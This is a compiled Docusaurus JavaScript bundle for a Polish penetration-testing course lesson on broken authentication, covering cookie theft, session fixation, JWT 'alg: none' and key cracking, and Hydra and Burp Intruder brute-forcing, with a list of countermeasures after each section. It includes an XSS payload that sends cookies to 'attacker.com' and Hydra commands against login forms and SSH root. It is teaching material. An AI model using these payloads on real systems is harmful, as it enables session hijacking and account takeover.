"use strict";(self.webpackChunkmy_page=self.webpackChunkmy_page||[]).push([[5055],{28453:(e,n,i)=>{i.d(n,{R:()=>o,x:()=>t});var a=i(96540);const r={},s=a.createContext(r);function o(e){const n=a.useContext(s);return a.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function t(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:o(e.components),a.createElement(s.Provider,{value:n},e.children)}},64846:(e,n,i)=>{i.r(n),i.d(n,{assets:()=>c,contentTitle:()=>t,default:()=>u,frontMatter:()=>o,metadata:()=>a,toc:()=>l});const a=JSON.parse('{"id":"kurs-kali-linux/broken-authentication","title":"\ud83d\udd10 Broken Authentication & Session Management","description":"Luki w uwierzytelnianiu i zarz\u0105dzaniu sesjami umo\u017cliwiaj\u0105 atakuj\u0105cym przej\u0119cie kont u\u017cytkownik\xf3w, odczytanie sesji, a nawet eskalacj\u0119 uprawnie\u0144. W tej sekcji om\xf3wimy najcz\u0119stsze ataki oraz sposoby ich przeprowadzania.","source":"@site/docs/kurs-kali-linux/08-broken-auth.md","sourceDirName":"kurs-kali-linux","slug":"/kurs-kali-linux/broken-authentication","permalink":"/docs/kurs-kali-linux/broken-authentication","draft":false,"unlisted":false,"editUrl":"https://github.com/przemyslvw/my-page/edit/master/docs/kurs-kali-linux/08-broken-auth.md","tags":[],"version":"current","sidebarPosition":8,"frontMatter":{"id":"broken-authentication","title":"\ud83d\udd10 Broken Authentication & Session Management","sidebar_position":8},"sidebar":"tutorialSidebar","previous":{"title":"\ud83d\udc89 Injection Attacks (SQL Injection, Command Injection, LDAP Injection)","permalink":"/docs/kurs-kali-linux/injection-attacks"},"next":{"title":"\ud83c\udfaf Cross-Site Scripting (XSS)","permalink":"/docs/kurs-kali-linux/cross-site-scripting"}}');var r=i(74848),s=i(28453);const o={id:"broken-authentication",title:"\ud83d\udd10 Broken Authentication & Session Management",sidebar_position:8},t="\ud83d\udd10 Broken Authentication & Session Management",c={},l=[{value:"\ud83c\udfad Ataki na sesje u\u017cytkownik\xf3w (JWT, Cookies)",id:"-ataki-na-sesje-u\u017cytkownik\xf3w-jwt-cookies",level:2},{value:"<strong>1\ufe0f\u20e3 Ataki na Cookies</strong>",id:"1\ufe0f\u20e3-ataki-na-cookies",level:3},{value:"<strong>Odczytanie cookies w przegl\u0105darce</strong>",id:"odczytanie-cookies-w-przegl\u0105darce",level:4},{value:"<strong>Kradzie\u017c sesji przez XSS</strong>",id:"kradzie\u017c-sesji-przez-xss",level:4},{value:"<strong>Modyfikacja sesji (Session Fixation)</strong>",id:"modyfikacja-sesji-session-fixation",level:4},{value:"<strong>2\ufe0f\u20e3 Ataki na JWT (JSON Web Tokens)</strong>",id:"2\ufe0f\u20e3-ataki-na-jwt-json-web-tokens",level:3},{value:"<strong>Brak podpisu JWT</strong>",id:"brak-podpisu-jwt",level:4},{value:"<strong>Podatno\u015b\u0107 na atak Brute-force algorytmu HS256</strong>",id:"podatno\u015b\u0107-na-atak-brute-force-algorytmu-hs256",level:4},{value:"\ud83d\udd11 Bruteforce i ataki na has\u0142a (Hydra, Burp Intruder)",id:"-bruteforce-i-ataki-na-has\u0142a-hydra-burp-intruder",level:2},{value:"<strong>1\ufe0f\u20e3 Atak bruteforce na logowanie (Hydra)</strong>",id:"1\ufe0f\u20e3-atak-bruteforce-na-logowanie-hydra",level:3},{value:"<strong>Bruteforce logowania HTTP POST</strong>",id:"bruteforce-logowania-http-post",level:4},{value:"<strong>Bruteforce na SSH</strong>",id:"bruteforce-na-ssh",level:4},{value:"<strong>2\ufe0f\u20e3 Atak brute-force przy u\u017cyciu Burp Intruder</strong>",id:"2\ufe0f\u20e3-atak-brute-force-przy-u\u017cyciu-burp-intruder",level:3},{value:"<strong>Konfiguracja ataku</strong>",id:"konfiguracja-ataku",level:4}];function d(e){const n={code:"code",h1:"h1",h2:"h2",h3:"h3",h4:"h4",header:"header",hr:"hr",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,s.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.header,{children:(0,r.jsx)(n.h1,{id:"-broken-authentication--session-management",children:"\ud83d\udd10 Broken Authentication & Session Management"})}),"\n",(0,r.jsx)(n.p,{children:"Luki w uwierzytelnianiu i zarz\u0105dzaniu sesjami umo\u017cliwiaj\u0105 atakuj\u0105cym przej\u0119cie kont u\u017cytkownik\xf3w, odczytanie sesji, a nawet eskalacj\u0119 uprawnie\u0144. W tej sekcji om\xf3wimy najcz\u0119stsze ataki oraz sposoby ich przeprowadzania."}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"-ataki-na-sesje-u\u017cytkownik\xf3w-jwt-cookies",children:"\ud83c\udfad Ataki na sesje u\u017cytkownik\xf3w (JWT, Cookies)"}),"\n",(0,r.jsx)(n.h3,{id:"1\ufe0f\u20e3-ataki-na-cookies",children:(0,r.jsx)(n.strong,{children:"1\ufe0f\u20e3 Ataki na Cookies"})}),"\n",(0,r.jsx)(n.p,{children:"Pliki cookie zawieraj\u0105 dane sesyjne u\u017cytkownika i mog\u0105 by\u0107 celem ataku."}),"\n",(0,r.jsx)(n.h4,{id:"odczytanie-cookies-w-przegl\u0105darce",children:(0,r.jsx)(n.strong,{children:"Odczytanie cookies w przegl\u0105darce"})}),"\n",(0,r.jsx)(n.p,{children:"W konsoli przegl\u0105darki (F12 \u2192 Console):"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"document.cookie\n"})}),"\n",(0,r.jsx)(n.h4,{id:"kradzie\u017c-sesji-przez-xss",children:(0,r.jsx)(n.strong,{children:"Kradzie\u017c sesji przez XSS"})}),"\n",(0,r.jsx)(n.p,{children:"Je\u015bli aplikacja jest podatna na XSS, mo\u017cna wykra\u015b\u0107 sesj\u0119 u\u017cytkownika:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"<script>\n  fetch('http://attacker.com/steal?cookie=' + document.cookie);\n<\/script>\n"})}),"\n",(0,r.jsx)(n.h4,{id:"modyfikacja-sesji-session-fixation",children:(0,r.jsx)(n.strong,{children:"Modyfikacja sesji (Session Fixation)"})}),"\n",(0,r.jsx)(n.p,{children:"Je\u015bli aplikacja nie zmienia ID sesji po zalogowaniu, atakuj\u0105cy mo\u017ce wymusi\u0107 u\u017cycie konkretnej sesji:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-http",children:"Set-Cookie: PHPSESSID=attackerSession; path=/; HttpOnly\n"})}),"\n",(0,r.jsx)(n.p,{children:"Zabezpieczenia:"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.strong,{children:"U\u017cywanie HttpOnly i Secure cookies"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.strong,{children:"Regeneracja ID sesji po zalogowaniu"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.strong,{children:"Ustawienie polityki SameSite dla ochrony przed CSRF"})}),"\n"]}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h3,{id:"2\ufe0f\u20e3-ataki-na-jwt-json-web-tokens",children:(0,r.jsx)(n.strong,{children:"2\ufe0f\u20e3 Ataki na JWT (JSON Web Tokens)"})}),"\n",(0,r.jsx)(n.p,{children:"JWT s\u0105 cz\u0119sto u\u017cywane do autoryzacji, ale mog\u0105 by\u0107 podatne na ataki."}),"\n",(0,r.jsx)(n.h4,{id:"brak-podpisu-jwt",children:(0,r.jsx)(n.strong,{children:"Brak podpisu JWT"})}),"\n",(0,r.jsx)(n.p,{children:"Je\u015bli aplikacja akceptuje niepodpisane JWT, mo\u017cna podmieni\u0107 payload:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-json",children:'{\n  "alg": "none",\n  "typ": "JWT"\n}\n'})}),"\n",(0,r.jsx)(n.p,{children:"Przyk\u0142adowe narz\u0119dzie do dekodowania JWT:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"jwt_tool token_here -d\n"})}),"\n",(0,r.jsx)(n.h4,{id:"podatno\u015b\u0107-na-atak-brute-force-algorytmu-hs256",children:(0,r.jsx)(n.strong,{children:"Podatno\u015b\u0107 na atak Brute-force algorytmu HS256"})}),"\n",(0,r.jsx)(n.p,{children:"Je\u015bli klucz podpisuj\u0105cy JWT jest s\u0142aby, mo\u017cna go z\u0142ama\u0107:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"jwtcrack mytoken.jwt\n"})}),"\n",(0,r.jsx)(n.p,{children:"Zabezpieczenia:"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.strong,{children:"U\u017cywanie silnego klucza podpisuj\u0105cego JWT"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.strong,{children:"Ustawienie kr\xf3tkiego czasu \u017cycia token\xf3w"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.strong,{children:"Odrzucanie niepodpisanych JWT"})}),"\n"]}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"-bruteforce-i-ataki-na-has\u0142a-hydra-burp-intruder",children:"\ud83d\udd11 Bruteforce i ataki na has\u0142a (Hydra, Burp Intruder)"}),"\n",(0,r.jsx)(n.h3,{id:"1\ufe0f\u20e3-atak-bruteforce-na-logowanie-hydra",children:(0,r.jsx)(n.strong,{children:"1\ufe0f\u20e3 Atak bruteforce na logowanie (Hydra)"})}),"\n",(0,r.jsx)(n.p,{children:"Hydra umo\u017cliwia atakowanie formularzy logowania metod\u0105 si\u0142ow\u0105."}),"\n",(0,r.jsx)(n.h4,{id:"bruteforce-logowania-http-post",children:(0,r.jsx)(n.strong,{children:"Bruteforce logowania HTTP POST"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'hydra -l admin -P passwords.txt example.com http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"\n'})}),"\n",(0,r.jsx)(n.p,{children:"Opcje:"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.code,{children:"-l admin"})," \u2013 login u\u017cytkownika"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.code,{children:"-P passwords.txt"})," \u2013 lista hase\u0142"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.code,{children:"http-post-form"})," \u2013 atak na formularz POST"]}),"\n"]}),"\n",(0,r.jsx)(n.h4,{id:"bruteforce-na-ssh",children:(0,r.jsx)(n.strong,{children:"Bruteforce na SSH"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"hydra -l root -P passwords.txt ssh://192.168.1.10\n"})}),"\n",(0,r.jsx)(n.p,{children:"Zabezpieczenia:"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.strong,{children:"Ograniczenie liczby nieudanych pr\xf3b logowania"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.strong,{children:"Uwierzytelnianie wielosk\u0142adnikowe (MFA)"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.strong,{children:"Blokowanie podejrzanych adres\xf3w IP"})}),"\n"]}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h3,{id:"2\ufe0f\u20e3-atak-brute-force-przy-u\u017cyciu-burp-intruder",children:(0,r.jsx)(n.strong,{children:"2\ufe0f\u20e3 Atak brute-force przy u\u017cyciu Burp Intruder"})}),"\n",(0,r.jsx)(n.p,{children:"Burp Suite Intruder pozwala na ataki s\u0142ownikowe na formularze logowania."}),"\n",(0,r.jsx)(n.h4,{id:"konfiguracja-ataku",children:(0,r.jsx)(n.strong,{children:"Konfiguracja ataku"})}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsx)(n.li,{children:"Przechwy\u0107 \u017c\u0105danie logowania w Burp Suite."}),"\n",(0,r.jsxs)(n.li,{children:["Przekieruj je do zak\u0142adki ",(0,r.jsx)(n.code,{children:"Intruder"})," \u2192 ",(0,r.jsx)(n.code,{children:"Positions"}),"."]}),"\n",(0,r.jsxs)(n.li,{children:["Ustaw ",(0,r.jsx)(n.code,{children:"\xa7"})," wok\xf3\u0142 parametr\xf3w ",(0,r.jsx)(n.code,{children:"username"})," i ",(0,r.jsx)(n.code,{children:"password"}),"."]}),"\n",(0,r.jsxs)(n.li,{children:["Wybierz ",(0,r.jsx)(n.code,{children:"Payloads"})," \u2192 dodaj list\u0119 login\xf3w i hase\u0142."]}),"\n",(0,r.jsx)(n.li,{children:"Uruchom atak i sprawd\u017a, kt\xf3re odpowiedzi r\xf3\u017cni\u0105 si\u0119 od pozosta\u0142ych."}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"Zabezpieczenia:"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.strong,{children:"Wprowadzenie CAPTCHA"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.strong,{children:"Op\xf3\u017anienia po nieudanych pr\xf3bach logowania"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.strong,{children:"Monitorowanie nietypowego ruchu logowania"})}),"\n"]}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsxs)(n.p,{children:["Podatno\u015bci w uwierzytelnianiu s\u0105 jednym z najpowa\u017cniejszych zagro\u017ce\u0144 dla aplikacji webowych. Kolejnym krokiem b\u0119dzie analiza podatno\u015bci ",(0,r.jsx)(n.strong,{children:"Cross-Site Scripting (XSS)"}),"! \ud83c\udfaf"]})]})}function u(e={}){const{wrapper:n}={...(0,s.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(d,{...e})}):d(e)}}}]);